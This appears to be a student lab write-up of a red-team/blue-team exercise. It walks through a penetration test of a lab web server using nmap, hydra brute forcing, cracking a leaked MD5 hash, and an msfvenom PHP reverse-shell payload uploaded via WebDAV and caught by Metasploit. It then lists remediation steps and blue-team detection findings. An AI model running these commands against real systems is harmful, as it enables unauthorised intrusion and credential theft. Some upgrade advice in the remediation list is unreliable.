# Red-vs-Blue-team-project
![image](https://user-images.githubusercontent.com/93951164/172183135-bcba72f9-8218-4347-b0a1-b3357e42fb22.png)

Red Team Environment
![image](https://user-images.githubusercontent.com/93951164/172183644-704fc94b-0767-4825-98a4-cc7e2236fb7c.png)


Blue Team Environment
![image](https://user-images.githubusercontent.com/93951164/172183602-e05f67a5-c68e-4f60-a6e7-8f309fdcfa65.png)



RED TEAM - Penetration Test
EXPLOITATION
Discover target IP:
To discover the target ip:
netdiscover -r <ip subnet>
 ![image](https://user-images.githubusercontent.com/93951164/172183767-b4d872a5-8284-4cef-8715-17feaaf50a54.png)



IP
Machine
192.168.1.1
Gateway IP, Hyper-V
192.168.1.100
ELK server
192.168.1.105
Capstone, target machine

Service and version scan:
nmap -sV -v 192.168.1.105
 
Port
Service
Version
Port 22
SSH
OpenSSH 7.6p1
Port 80
HTTP
Apache httpd 2.4.29

![image](https://user-images.githubusercontent.com/93951164/172183948-c5a858fd-f171-485a-a987-76f4cd11ae14.png)

![image](https://user-images.githubusercontent.com/93951164/172183970-515cea98-3528-4b92-aa5e-9c04972e3091.png)

Aggressive scan:
nmap -A -vvv 192.168.1.105
 
A simple aggressive scan reveals a web server directory structure on tcp port 80, which is a http port, and two potential usernames of employees – ashton and hannah (which will be more relevant for brute forcing later):
![image](https://user-images.githubusercontent.com/93951164/172184023-ef8199ba-6485-4260-ade2-a03d25def67e.png)

![image](https://user-images.githubusercontent.com/93951164/172422198-48f6259d-af5f-4e98-9495-46046796c7b1.png)

Navigating the Webserver:
As this is a webserver, we can investigate further from a browser in the attacker machine:

In a text document the blog directory we can see a 3rd potential username – Ryan, who would potentially have the highest level access as CEO:

In the company folders directory, we can see reference to a "secret_folder" in ALL documents within this directory, which is now a target for this Penetration Test.

The meet_our_team folder confirms the three potential users, and each document references the secret_folder:

As we can see below, we will need Ashton's password to gain access to the secure hidden folder.

Vulnerability scan:
nmap -A --script=vuln -vvv 192.168.1.105
 
Returning to scanning for further recon.
Aggressive scan with a vulnerability script reveals:
Webdav vulnerability
SQL Injection vulnerability across all directories on the webserver
CVE-2017-15710 – Apache httpd vulnerability




Bruteforce:
Now that we have some usernames and a main target - Ashton, using hydra we can attempt to bruteforce the login for the secret_folder.
Ashton, the CEO, had a common password within our password list. Using the following command, we could get Ashton's password.
hydra -l ashton -P /opt/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get "/company_folders/secret_folder"
 

SSH:
ssh ashton@192.168.1.105
 
Using Ashton's credentials we could gain ssh entry into the server.


Flag 1
In the root home directory we could pickup a flag.

Using the same credentials, we could access the protected hidden folder.

Password hash:
Within this folder was a document with instructions to connect to a corp_server. Included in the document are Ryan's hashed credentials and reference to a webdav directory


Th hashed md5 password was instantly cracked using Crackstation, revealing the password linux4u

Webdav:
We could then login to webdav using Ryan's credentials.


Reverse Shell:
Msfvenom
The next task was to upload a shell script to webdav, in order to create a reverse shell.
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 -f raw -o shell.php
 
Using msfvenom we created a payload – shell.php

Cadaver
cadaver http://192.168.1.105/webdav
 
Using cadaver and Ryan's credentials we accessed webdav, and uploaded the payload to the webdav directory.


Metasploit
msfconsole
use multi/handler
 
Once the payload was successfully uploaded, in order to create the reverse shell, we setup a listener using Metasploit.

After loading the exploit and activating the shell.php we uploaded earlier by clicking on it on the webserver, the target server connected to our listener and launched a meterpreter session into their system.

Gaining Interactive Shell:
python -c 'import pty; pty.spawn("/bin/bash")'
 

Finding Flag 2:
The next flag was located in the root directory.

Exit back to meterpreter.


Exfiltration:
The file was easily exfiltrated back to the attacker machine.


Vulnerabilities
Webserver
1. Directory listing vulnerability. Webserver directories are open to the public and navigable in a browser.
CWE-548: Exposure of Information Through Directory Listing
https://cwe.mitre.org/data/definitions/548.html
Attackers can gather a lot of information from open directories. They can use this information and access to launch attacks and upload malicious content. These directories may also be vulnerable to path traversal in which users can navigate across to sensitive regions of the system.
Disable the ability to view directories in the browser, and disable access/password protect all directories to avoid path traversal. Sanitise input to avoid malicious SQL statements.
2. SQL Injection. Nmap revealed a possible vulnerability to SQL injection to the directories in the webserver.
This can allow attackers to enter malicious code and gain access or launch attacks.
Sanitise inputs.
3. Documents with usernames in plain text are available to the public in the webserver
CWE-312: Cleartext Storage of Sensitive Information
https://cwe.mitre.org/data/definitions/312.html
CWE-256: Unprotected Storage of Credentials
https://cwe.mitre.org/data/definitions/256.html
Attackers can use this information in bruteforce attacks. Even just one name can lead to a system breach.
Users should not be using their own names as usernames. User names should not be published anywhere, especially not a webserver.
4. Documents in the webserver give direct reference to a hidden directory with sensitive data.
These are breadcrumbs that attackers will follow, with a direct reference to a hidden directory attackers can focus attacks to access the contents of the directory.
Do not reference sensitive directories in publicly available documents. If it is necessary to mention it, then encrypt and password protect.
5. Webdav is enabled and allows uploading of malicious script.
CWE-434: Unrestricted Upload of File with Dangerous Type
https://cwe.mitre.org/data/definitions/434.html
It is easy to create a shell in the target system using a reverse shell, by opening a meterpreter session
Disable webdav
6. Missing encryption of sensitive data.
CWE-311: Missing Encryption of Sensitive Data
https://cwe.mitre.org/data/definitions/311.html
7. CWE-522: Insufficiently Protected Credentials
Users and Passwords
1. Usernames are employee first names.
These are too obvious and most likely discoverable through Google Dorking. All are high level employees of the company which are more vulnerable, and certainly easier to find in the company structure in publicly available material.
Attackers can (with very little investigation) create a wordlist of usernames of employees for bruteforcing.
Usernames should not include the person's name.
2. Ryan's password hash was printed into a document, publicly available on the webserver.
The password hash is highly confidential and vulnerable once an attacker can access it.
CWE-256: Unprotected Storage of Credentials
https://cwe.mitre.org/data/definitions/256.html
A password hash is one of the highest targets for an attacker that is trying to gain entry; being able to navigate to one in a browser through minimal effort is a critical vulnerability.
Password hashes should remain in the /etc/shadow directory with root only access in the system, and not be published or copied anywhere.
3. CWE-759: Use of a One-Way Hash without a Salt.
https://cwe.mitre.org/data/definitions/759.html
CWE-916: Use of Password Hash With Insufficient Computational Effort
https://cwe.mitre.org/data/definitions/916.html
Ryan's password is only hashed, but not salted. A password hash can be run through apps to crack the password, however a salted hash will be almost impossible to crack.
A simple hash can be cracked with tools in linux or through websites, in this case it took seconds to crack Ryan's hash.
Salt hashes.
4. CWE-521: Weak Password Requirements.
https://cwe.mitre.org/data/definitions/521.html
Passwords need to have a minimum requirement of password length and use of mixed characters and case.
linux4u is a simple phrase with very common word substitution – 4=for, u=you. and leopoldo is a common name that could easily be bruteforced with a common password list.
Require strong passwords that exclude phrases and names, minimum 8 characters, mixed characters that include a combination of lower case, upper case, special characters and numbers.
Consider implementing multi-factor authentication.
Apache 2.4.29
1. CVE-2017-15710
This potential Apache httpd vulnerability was picked up by nmap and relates to a configuration that verifies user credentials; a particular header value is searched for and if it is not present in the charset conversion table, it reverts to a fallback of 2 characters (eg. en-US becomes en). While this risk is unlikely, if there is a header value of less than 2 characters, the system may crash.
This vulnerability has the potential to force a Denial of Service attack.
As this vulnerability applies to a range of Apache httpd versions from 2.0.23 to 2.4.29, upgrading to the latest version 2.2.46 may mitigate this risk.
2. CVE-2018-1312
While this vulnerability wasn't picked up in any scans, the apache version remains vulnerable. From cve-mitre "When generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection."
With this vulnerability, an attacker would be able to replay HTTP requests across a cluster of servers (that are using a common Digest authentication configuration), whilst avoiding detection.
Apache httpd versions 2.2.0 to 2.4.29 are vulnerable - upgrade to 2.2.46
3. CVE-2017-1283
Mod_session is configured to forward its session data to CGI applications
With this vulnerability, a remote user may influence their content by using a "Session" header.
Apache httpd versions 2.2.0 to 2.4.29 are vulnerable - upgrade to 2.2.46
4. CVE-2017-15715
This vulnerability relates to malicious filenames, in which the end of filenames can be matched/replaced with '$'
In systems where file uploads are externally blocked, this vulnerability can be exploited to upload malicious files
Apache httpd versions 2.2.0 to 2.4.29 are vulnerable - upgrade to 2.2.46
 
Identifying the port scan:
Filtering for Nmap:


Monitoring requests to the " _ secret_folder _ ":



Filtering for the Hydra brute force attack:
There were 346,595 bruteforce attempts made with Hydra.


Finding the WebDAV connection:
A reverse shell in webdav was used 20 times.



 
